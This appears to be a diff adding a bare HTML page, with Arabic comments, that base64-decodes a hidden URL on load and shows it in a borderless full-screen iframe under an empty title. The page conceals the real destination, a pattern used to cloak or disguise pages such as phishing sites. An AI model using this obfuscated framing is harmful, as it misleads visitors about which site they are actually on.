@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; }
+        iframe { width: 100%; height: 100%; border: none; }
+    </style>
+</head>
+<body>
+
+    <div id="view-container" style="height: 100vh; width: 100vw;"></div>
+
+    <script>
+        
+        const encodedUrl = "aHR0cHM6Ly9lbGdvaGFyeW1kLmdpdGh1Yi5pby9BZG1pbjEyM2RvcGFtZW4v";
+
+        // وظيفة فك التشفير وعرض الرابط
+        function loadContent() {
+            try {
+                const decodedUrl = atob(encodedUrl); // فك تشفير Base64
+                const container = document.getElementById('view-container');
+                
+                // إنشاء عنصر iframe لعرض الرابط
+                const iframe = document.createElement('iframe');
+                iframe.src = decodedUrl;
+                iframe.setAttribute('allowfullscreen', '');
+                
+                container.appendChild(iframe);
+            } catch (e) {
+                console.error("فشل في تحميل .");
+            }
+        }
+
+        // تشغيل الوظيفة عند تحميل الصفحة
+        window.onload = loadContent;
+    </script>
+</body>
+</html>
